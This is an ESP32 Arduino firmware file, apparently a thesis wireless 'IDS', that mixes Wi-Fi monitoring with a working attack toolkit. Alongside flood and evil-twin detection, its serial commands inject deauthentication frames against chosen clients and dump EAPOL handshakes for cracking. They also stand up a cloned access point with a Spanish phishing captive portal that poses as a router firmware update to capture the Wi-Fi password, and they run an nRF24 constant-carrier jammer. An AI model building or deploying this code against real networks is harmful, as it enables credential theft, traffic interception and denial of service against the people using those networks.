#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include <SPI.h>
#include <RF24.h>
#include <DNSServer.h>
#include <WebServer.h>

DNSServer dnsServer;
WebServer webServer(80);
String current_clone_ssid = "";

const char* captive_html = R"=====(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Actualización de Seguridad del Router</title>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
h2 { color: #d9534f; }
p { font-size: 14px; color: #666; margin-bottom: 20px; }
input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
button { background-color: #0275d8; color: white; border: none; padding: 12px 20px; text-transform: uppercase; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }
button:hover { background-color: #025aa5; }
.footer { margin-top: 20px; font-size: 10px; color: #aaa; }
</style>
</head>
<body>
<div class="container">
<h2>Actualización de Seguridad Crítica</h2>
<p>Se requiere una actualización urgente del firmware del router para mantener su conexión segura. Por favor, ingrese su contraseña de Wi-Fi para proceder.</p>
<form action="/login" method="POST">
<input type="password" name="password" placeholder="Contraseña de Wi-Fi" required>
<button type="submit">Actualizar Firmware</button>
</form>
<div class="footer">&copy; 2026 Router Management System</div>
</div>
</body>
</html>
)=====";

// ============================================
// ESTRUCTURAS DE DATOS Y RED
// ============================================
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t addr1[6]; // MAC Destino
  uint8_t addr2[6]; // MAC Origen
  uint8_t addr3[6]; // BSSID
  uint16_t sequence_ctrl;
} mac_header_t;

// Estructura de auditoría
struct NetworkAudit {
  String ssid;
  bool has_rsn;
  bool is_mfp_capable; // Management Frame Protection (802.11w)
  bool exposes_pmkid;  // PMKSA / PMKID exposure
  bool wps_enabled;
  bool wps_locked;
};

// ============================================
// VARIABLES GLOBALES
// ============================================
const int HOP_INTERVAL = 150; 
int current_channel = 1;

volatile int deauth_counter = 0;
volatile int beacon_counter = 0;
volatile int probe_req_counter = 0;
volatile int eapol_counter = 0;

unsigned long last_report = 0;
volatile unsigned long lock_channel_until = 0;
bool channel_locked = false;
int locked_channel = 1;
bool is_cloning = false;

// ============================================
// MODULO RF TACTICO (nRF24L01+)
// ============================================
RF24 radio(4, 5); // CE=GPIO4, CSN=GPIO5
enum NrfState { NRF_IDLE, NRF_SWEEP, NRF_JAM };
NrfState nrf_state = NRF_IDLE;
int jam_channel = 0;
uint8_t sweep_values[126];

// TABLA HEURÍSTICA ANTI-EVIL TWIN Y REDES OCULTAS
#define MAX_NETWORKS 50
struct KnownNetwork {
  String ssid;
  String bssid;
  bool is_hidden;
};
KnownNetwork known_networks[MAX_NETWORKS];
int network_count = 0;

// ============================================
// FUNCIONES FORENSES
// ============================================

String formatMac(uint8_t *mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", 
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

String dumpHex(uint8_t *data, int len) {
  String out = "";
  out.reserve(len * 2);
  for (int i = 0; i < len; i++) {
    char buf[3];
    sprintf(buf, "%02X", data[i]);
    out += buf;
  }
  return out;
}

NetworkAudit analyzeTags(uint8_t *payload, int payload_len, int offset) {
  NetworkAudit audit = {"", false, false, false};
  uint8_t *tag_data = payload + offset;
  int remaining = payload_len - offset;
  
  while (remaining >= 2) {
    uint8_t tag_num = tag_data[0];
    uint8_t tag_len = tag_data[1];
    
    if (remaining < 2 + tag_len) break; 
    
    if (tag_num == 0) { 
      if (tag_len == 0 || tag_data[2] == 0x00) {
        audit.ssid = "<Red_Oculta>";
      } else {
        char ssid_buf[33];
        int copy_len = (tag_len > 32) ? 32 : tag_len;
        memcpy(ssid_buf, tag_data + 2, copy_len);
        ssid_buf[copy_len] = '\0';
        for(int i = 0; i < copy_len; i++) {
          if(ssid_buf[i] < 32 || ssid_buf[i] > 126) ssid_buf[i] = '.';
        }
        audit.ssid = String(ssid_buf);
      }
    }
    
    if (tag_num == 48) {
      audit.has_rsn = true;
      int rsn_offset = 2; // version
      rsn_offset += 4;    // group cipher
      
      if (rsn_offset + 2 <= tag_len + 2) {
        uint16_t pc_cnt = tag_data[rsn_offset] | (tag_data[rsn_offset + 1] << 8);
        rsn_offset += 2 + (4 * pc_cnt); // pairwise
        if (rsn_offset + 2 <= tag_len + 2) {
          uint16_t akm_cnt = tag_data[rsn_offset] | (tag_data[rsn_offset + 1] << 8);
          rsn_offset += 2 + (4 * akm_cnt); // akm
          if (rsn_offset + 2 <= tag_len + 2) {
            uint16_t rsn_cap = tag_data[rsn_offset] | (tag_data[rsn_offset + 1] << 8);
            if ((rsn_cap & (1 << 7)) || (rsn_cap & (1 << 6))) audit.is_mfp_capable = true;
            rsn_offset += 2; // RSN Capabilities
            
            // PMKID Count check (Client-less attack vulnerability)
            if (rsn_offset + 2 <= tag_len + 2) {
                uint16_t pmkid_cnt = tag_data[rsn_offset] | (tag_data[rsn_offset + 1] << 8);
                if (pmkid_cnt > 0) audit.exposes_pmkid = true;
            }
          }
        }
      }
    }
    
    // Vendor Specific Tag (ID 221) - Búsqueda de WPS
    if (tag_num == 221 && tag_len >= 4) {
        // OUI para WPS es 00:50:f2 y el OUI Type es 04
        if (tag_data[2] == 0x00 && tag_data[3] == 0x50 && tag_data[4] == 0xF2 && tag_data[5] == 0x04) {
            audit.wps_enabled = true;
            // Parsear TLVs dentro del payload WPS (empieza en tag_data + 6)
            int wps_offset = 6;
            while (wps_offset + 4 <= tag_len + 2) {
                uint16_t tlv_type = (tag_data[wps_offset] << 8) | tag_data[wps_offset + 1];
                uint16_t tlv_len = (tag_data[wps_offset + 2] << 8) | tag_data[wps_offset + 3];
                
                // Atributo: AP Setup Locked (0x1057)
                if (tlv_type == 0x1057 && tlv_len == 1) {
                    if (tag_data[wps_offset + 4] == 0x01) {
                        audit.wps_locked = true;
                    }
                }
                wps_offset += 4 + tlv_len;
            }
        }
    }
    
    tag_data += 2 + tag_len;
    remaining -= 2 + tag_len;
  }
  return audit;
}

// ============================================
// LÓGICA PRINCIPAL (DPI Y SIGINT)
// ============================================
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  mac_header_t *mac_hdr = (mac_header_t *)pkt->payload;
  int payload_len = pkt->rx_ctrl.sig_len;
  int rssi = pkt->rx_ctrl.rssi; // EXTRACCIÓN DE FUERZA DE SEÑAL

  if (payload_len < sizeof(mac_header_t)) return;

  uint8_t frame_type = (mac_hdr->frame_ctrl & 0x0C) >> 2;
  uint8_t frame_subtype = (mac_hdr->frame_ctrl & 0xF0) >> 4;

  String destMac = formatMac(mac_hdr->addr1);
  String srcMac  = formatMac(mac_hdr->addr2);
  String bssid   = formatMac(mac_hdr->addr3);

  // TRAMAS DE GESTIÓN
  if (frame_type == 0) {
    
    // 1. BEACONS (Subtipo 8)
    if (frame_subtype == 8) {
      beacon_counter++;
      NetworkAudit audit = analyzeTags(pkt->payload, payload_len, sizeof(mac_header_t) + 12);
      
      bool found = false;
      for (int i = 0; i < network_count; i++) {
        if (known_networks[i].bssid == bssid) {
          found = true;
          // Evil Twin Check (mismo SSID, diferente MAC)
          if (known_networks[i].ssid != "<Red_Oculta>" && audit.ssid != "<Red_Oculta>" && known_networks[i].ssid != audit.ssid) {
             // Red re-utilizando MAC o MAC re-utilizando nombre? Si el BSSID es el mismo pero el SSID cambia, alguien está inyectando Beacons locos.
          }
          break;
        }
      }

      // Check Evil Twin SSID collision
      if (audit.ssid.length() > 0 && audit.ssid != "<Red_Oculta>") {
        for (int i = 0; i < network_count; i++) {
          if (known_networks[i].ssid == audit.ssid && known_networks[i].bssid != bssid && !known_networks[i].is_hidden) {
            Serial.printf("{\"event\":\"alert\", \"type\":\"evil_twin_detected\", \"ssid\":\"%s\", \"legit_mac\":\"%s\", \"rogue_mac\":\"%s\", \"rssi\":%d, \"channel\":%d}\n", 
                          audit.ssid.c_str(), known_networks[i].bssid.c_str(), bssid.c_str(), rssi, current_channel);
          }
        }
      }

      if (!found) {
        if (network_count < MAX_NETWORKS) {
          known_networks[network_count].ssid = audit.ssid;
          known_networks[network_count].bssid = bssid;
          known_networks[network_count].is_hidden = (audit.ssid == "<Red_Oculta>");
          network_count++;
        }
        
        Serial.printf("{\"event\":\"audit\", \"type\":\"network_discovered\", \"ssid\":\"%s\", \"bssid\":\"%s\", \"mfp_protected\":%s, \"pmkid\":%s, \"wps_enabled\":%s, \"wps_locked\":%s, \"rssi\":%d, \"channel\":%d}\n", 
                      audit.ssid.c_str(), bssid.c_str(), audit.is_mfp_capable ? "true" : "false", audit.exposes_pmkid ? "true" : "false", audit.wps_enabled ? "true" : "false", audit.wps_locked ? "true" : "false", rssi, current_channel);
      }
      
      // EXTRAER EL BEACON EN HEXADECIMAL PARA EL PCAP (Necesario para crackear el Handshake)
      // Lo hacemos siempre (o cada poco) para asegurar que el PCAP capturado a posteriori tenga el Beacon
      // Limitamos a no hacerlo cada milisegundo para no saturar el Serial, lo hacemos de forma aleatoria (1 de cada 10)
      if (millis() % 10 == 0 || !found) {
          String hex_dump = dumpHex(pkt->payload, payload_len);
          Serial.printf("{\"event\":\"pcap_dump\", \"bssid\":\"%s\", \"pcap_raw_hex\":\"%s\"}\n", bssid.c_str(), hex_dump.c_str());
      }
    }
    
    // 2. PROBE RESPONSES (Subtipo 5) - DE-CLOAKING
    else if (frame_subtype == 5) {
      NetworkAudit audit = analyzeTags(pkt->payload, payload_len, sizeof(mac_header_t) + 12);
      if (audit.ssid.length() > 0 && audit.ssid != "<Red_Oculta>") {
        // Verificar si desenmascaramos una red oculta
        for (int i = 0; i < network_count; i++) {
          if (known_networks[i].bssid == bssid && known_networks[i].is_hidden) {
            known_networks[i].ssid = audit.ssid;
            known_networks[i].is_hidden = false;
            Serial.printf("{\"event\":\"decloak\", \"bssid\":\"%s\", \"ssid\":\"%s\", \"rssi\":%d, \"channel\":%d}\n", 
                          bssid.c_str(), audit.ssid.c_str(), rssi, current_channel);
          }
        }
      }
    }

    // 3. PROBE REQUESTS (Subtipo 4)
    else if (frame_subtype == 4) {
      probe_req_counter++;
      NetworkAudit audit = analyzeTags(pkt->payload, payload_len, sizeof(mac_header_t));
      if (audit.ssid.length() > 0 && audit.ssid != "<Red_Oculta>") {
        Serial.printf("{\"event\":\"probe_req\", \"client\":\"%s\", \"searching_ssid\":\"%s\", \"rssi\":%d, \"channel\":%d}\n", 
                      srcMac.c_str(), audit.ssid.c_str(), rssi, current_channel);
      }
    }

    // 4. DEAUTHENTICATION (Subtipo 12)
    else if (frame_subtype == 12) {
      deauth_counter++;
      uint16_t reason_code = 0;
      if (payload_len >= sizeof(mac_header_t) + 2) {
        reason_code = pkt->payload[sizeof(mac_header_t)] | (pkt->payload[sizeof(mac_header_t)+1] << 8);
      }
      Serial.printf("{\"event\":\"deauth\", \"src\":\"%s\", \"dst\":\"%s\", \"bssid\":\"%s\", \"reason\":%d, \"rssi\":%d, \"channel\":%d}\n", 
                    srcMac.c_str(), destMac.c_str(), bssid.c_str(), reason_code, rssi, current_channel);
    }
  }
  
  // TRAMAS DE DATOS (HANDSHAKES Y TRÁFICO)
  else if (frame_type == 2) {
    bool is_eapol = false;
    for (int i = 24; i < payload_len - 1 && i < 50; i++) {
      if (pkt->payload[i] == 0x88 && pkt->payload[i+1] == 0x8E) {
        is_eapol = true;
        eapol_counter++;
        lock_channel_until = millis() + 5000; // Quedarse en este canal 5 segundos para cazar los 4 paquetes EAPOL
        String hex_dump = dumpHex(pkt->payload, payload_len);
        Serial.printf("{\"event\":\"eapol_handshake\", \"src\":\"%s\", \"dst\":\"%s\", \"channel\":%d, \"rssi\":%d, \"pcap_raw_hex\":\"%s\"}\n", 
                      srcMac.c_str(), destMac.c_str(), current_channel, rssi, hex_dump.c_str());
        break;
      }
    }
    
    // Muestreo estadístico de tráfico de datos (1 cada ~5ms) para inventario de dispositivos
    if (!is_eapol && millis() % 5 == 0) {
        Serial.printf("{\"event\":\"client_data\", \"src\":\"%s\", \"dst\":\"%s\", \"bssid\":\"%s\", \"rssi\":%d, \"channel\":%d}\n", 
                      srcMac.c_str(), destMac.c_str(), bssid.c_str(), rssi, current_channel);
    }
  }
}

// ============================================
// CONFIGURACIÓN
// ============================================
void setup() {
  Serial.setTxBufferSize(8192);
  Serial.begin(921600);
  delay(1000);
  Serial.println("{\"status\":\"started\", \"module\":\"ids_thesis_masterpiece\"}");

  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);
  
  // INICIALIZACIÓN nRF24L01+
  if (!radio.begin()) {
    Serial.println("{\"event\":\"alert\", \"type\":\"hardware_error\", \"msg\":\"⚠️ Módulo nRF24L01+ NO DETECTADO o mal conectado. Verifica el cableado SPI.\"}");
  } else {
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.setDataRate(RF24_2MBPS);
    radio.setPALevel(RF24_PA_MAX); // Usar el amplificador PA al máximo!
    radio.startListening();
    Serial.println("{\"event\":\"alert\", \"type\":\"hardware_ok\", \"msg\":\"📡 Módulo nRF24L01+ Detectado e Inicializado.\"}");
  }

  // INICIALIZACIÓN WI-FI (Usando API de Arduino para compatibilidad con WebServer)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Configuramos el modo promiscuo usando ESP-IDF sobre la base de Arduino
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
  esp_wifi_set_promiscuous(true);
  
  last_report = millis();
}

void inject_deauth(String bssid, String target) {
  uint8_t packet[26] = {
    0xc0, 0x00,                         // Frame Control: Subtype 12 (Deauth)
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destino (target)
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, // Origen (bssid)
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, // BSSID (bssid)
    0x00, 0x00,                         // Secuencia
    0x07, 0x00                          // Razón: 7
  };
  
  auto parse_mac = [](String s, uint8_t* out) {
    for (int i = 0; i < 6; i++) {
      out[i] = (uint8_t) strtol(s.substring(i*3, i*3+2).c_str(), NULL, 16);
    }
  };
  
  parse_mac(target, &packet[4]);
  parse_mac(bssid, &packet[10]);
  parse_mac(bssid, &packet[16]);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), true);
  Serial.printf("{\"event\":\"alert\", \"type\":\"attack_success\", \"msg\":\"🔥 Deauth inyectado (BSSID: %s -> Target: %s)\"}\n", bssid.c_str(), target.c_str());
}

void process_serial_command(String cmd) {
  cmd.trim();
  if (cmd.startsWith("LOCK_CH:")) {
    int ch = cmd.substring(8).toInt();
    if (ch >= 1 && ch <= 14) {
      channel_locked = true;
      locked_channel = ch;
      esp_wifi_set_channel(locked_channel, WIFI_SECOND_CHAN_NONE);
      Serial.printf("{\"event\":\"alert\", \"type\":\"channel_lock\", \"msg\":\"🔒 Canal anclado en %d\"}\n", locked_channel);
    }
  } else if (cmd == "HOP") {
    channel_locked = false;
    Serial.printf("{\"event\":\"alert\", \"type\":\"channel_hop\", \"msg\":\"📡 Búsqueda de canales reanudada\"}\n");
  } else if (cmd.startsWith("DEAUTH:")) {
    // DEAUTH:BSSID:TARGET
    int firstColon = cmd.indexOf(':', 7);
    if (firstColon != -1) {
      String bssid = cmd.substring(7, 7 + 17); // MAC: 17 chars
      String target = cmd.substring(7 + 17 + 1);
      if (bssid.length() == 17 && target.length() == 17) {
        // Enviar 3 veces para asegurar
        for(int i=0; i<3; i++) inject_deauth(bssid, target);
      }
    }
  } else if (cmd.startsWith("CLONE:")) {
    // CLONE:SSID:BSSID
    int firstColon = cmd.indexOf(':', 6);
    if (firstColon != -1) {
      String ssid = cmd.substring(6, firstColon);
      String bssid = cmd.substring(firstColon + 1);
      current_clone_ssid = ssid;
      
      uint8_t mac[6];
      for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t) strtol(bssid.substring(i*3, i*3+2).c_str(), NULL, 16);
      }
      
      // Detener temporalmente promiscuo
      esp_wifi_set_promiscuous(false);
      
      WiFi.mode(WIFI_AP_STA);
      esp_wifi_set_mac(WIFI_IF_AP, mac);
      
      IPAddress apIP(192, 168, 4, 1);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssid.c_str(), NULL, current_channel);
      
      // Iniciar Portal Cautivo
      dnsServer.start(53, "*", apIP);
      
      webServer.on("/", []() {
        webServer.send(200, "text/html", captive_html);
      });
      webServer.on("/login", HTTP_POST, []() {
        String pwd = webServer.arg("password");
        Serial.printf("{\"event\":\"credentials\", \"ssid\":\"%s\", \"username\":\"admin\", \"password\":\"%s\"}\n", current_clone_ssid.c_str(), pwd.c_str());
        webServer.send(200, "text/html", "<h2>Actualización iniciada. El router se reiniciará en 2 minutos... Ya puede cerrar esta ventana.</h2>");
      });
      webServer.onNotFound([]() {
        webServer.send(200, "text/html", captive_html);
      });
      webServer.begin();

      // Restaurar promiscuo
      esp_wifi_set_promiscuous(true);
      
      is_cloning = true;
      Serial.printf("{\"event\":\"alert\", \"type\":\"clone_started\", \"msg\":\"👿 Evil Twin Levantado (Portal Cautivo): %s (%s)\"}\n", ssid.c_str(), bssid.c_str());
    }
  } else if (cmd == "STOP_CLONE") {
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    dnsServer.stop();
    webServer.stop();
    WiFi.mode(WIFI_STA); // Volver a modo escucha normal
    esp_wifi_set_promiscuous(true);
    is_cloning = false;
    Serial.printf("{\"event\":\"alert\", \"type\":\"clone_stopped\", \"msg\":\"🛑 Evil Twin Apagado\"}\n");
  } else if (cmd == "SWEEP_RF") {
    nrf_state = NRF_SWEEP;
    radio.startListening();
    Serial.printf("{\"event\":\"alert\", \"type\":\"rf_sweep_started\", \"msg\":\"📊 Analizador de Espectro nRF24 Activo\"}\n");
  } else if (cmd.startsWith("JAM_RF:")) {
    int ch = cmd.substring(7).toInt();
    if(ch >= 0 && ch <= 125) {
      nrf_state = NRF_JAM;
      jam_channel = ch;
      radio.stopListening();
      radio.setChannel(jam_channel);
      radio.startConstCarrier(RF24_PA_MAX, jam_channel); // Ataque de fuerza bruta RF
      Serial.printf("{\"event\":\"alert\", \"type\":\"rf_jam_started\", \"msg\":\"🚫 JAMMER ACTIVO en canal nRF %d\"}\n", jam_channel);
    }
  } else if (cmd == "STOP_RF") {
    nrf_state = NRF_IDLE;
    radio.stopConstCarrier();
    radio.startListening();
    Serial.printf("{\"event\":\"alert\", \"type\":\"rf_stopped\", \"msg\":\"🛑 Modulo nRF24 en Reposo\"}\n");
  }
}

void loop() {
  if (Serial.available() > 0) {
    String cmd = Serial.readStringUntil('\n');
    process_serial_command(cmd);
  }
  
  // TAREAS NRF24L01+
  if (nrf_state == NRF_SWEEP) {
    String json = "{\"event\":\"rf_sweep\",\"data\":[";
    for(int i = 0; i <= 125; i++) {
      radio.setChannel(i);
      radio.startListening();
      delayMicroseconds(128); // Tiempo para asentar el sintetizador PLL
      radio.stopListening();
      sweep_values[i] = radio.testCarrier() ? 1 : 0; 
      
      // Intentamos cuantificar un poco más si hay portadora 
      // (testCarrier devuelve true si la señal > -64dBm)
      int pwr = sweep_values[i] ? 100 : 0; // Simplificado.
      
      json += String(pwr);
      if(i < 125) json += ",";
    }
    json += "]}";
    Serial.println(json);
  } else if (nrf_state == NRF_JAM) {
    // El modo ConstCarrier lo hace automáticamente por hardware.
    // Solo refrescamos el watchdog o hacemos delay.
    delay(10);
  }

  // TAREAS EVIL TWIN (Servidor Web y DNS)
  if (is_cloning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }

  // TAREAS WI-FI (Solo saltar canal si no estamos jameando)
  if (channel_locked) {
    delay(10);
  } else if (millis() > lock_channel_until) {
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    current_channel++;
    if (current_channel > 13) current_channel = 1;
    delay(HOP_INTERVAL);
  } else {
    // Estamos anclados temporalmente para no perder mensajes EAPOL
    delay(10);
  }

  if (millis() - last_report >= 1000) {
    last_report = millis();
    int b_count = beacon_counter;
    int d_count = deauth_counter;
    int p_count = probe_req_counter;
    int e_count = eapol_counter;
    
    beacon_counter = 0;
    deauth_counter = 0;
    probe_req_counter = 0;
    eapol_counter = 0;

    bool alert = false;
    if (b_count > 500) {
      Serial.printf("{\"event\":\"alert\", \"type\":\"beacon_flood\", \"count\":%d, \"channel\":%d}\n", b_count, current_channel);
      alert = true;
    } 
    if (d_count > 15) {
      Serial.printf("{\"event\":\"alert\", \"type\":\"deauth_flood\", \"count\":%d, \"channel\":%d}\n", d_count, current_channel);
      alert = true;
    } 
    digitalWrite(2, alert ? HIGH : LOW);
    
    Serial.printf("{\"event\":\"heartbeat\", \"beacons\":%d, \"deauths\":%d, \"probes\":%d, \"eapols\":%d, \"channel\":%d}\n", 
                  b_count, d_count, p_count, e_count, current_channel);
  }
}
